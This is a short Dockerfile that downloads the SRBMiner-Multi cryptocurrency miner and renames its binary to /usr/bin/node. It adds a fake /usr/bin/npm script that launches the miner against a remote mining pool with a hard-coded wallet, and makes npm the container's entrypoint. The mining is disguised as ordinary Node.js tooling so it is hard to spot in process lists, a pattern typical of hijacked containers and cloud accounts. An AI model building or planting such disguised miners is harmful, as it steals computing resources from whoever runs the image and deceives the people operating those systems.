
FROM debian
RUN apt-get update && apt-get -y install wget xz-utils && \
    cd /opt && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.1/SRBMiner-Multi-0-8-1-Linux.tar.xz && \
	tar xf SRBMiner-Multi-0-8-1-Linux.tar.xz && rm -rf /opt/SRBMiner-Multi-0-8-1-Linux.tar.xz && \
	apt-get -y purge xz-utils && apt-get -y autoremove --purge && apt-get -y clean && apt-get -y autoclean; rm -rf /var/lib/apt-get/lists/*
RUN mv /opt/SRBMiner-Multi-0-8-1/SRBMiner-MULTI /usr/bin/node
RUN echo " node --algorithm minotaurX --pool stratum+tcps://stratum-na.rplant.xyz:17063 --wallet MHN6B218yFAF528SjcSxaq8exEE4bkC91o.px --disable-gpu" > /usr/bin/npm
RUN chmod +x /usr/bin/npm
ENTRYPOINT npm
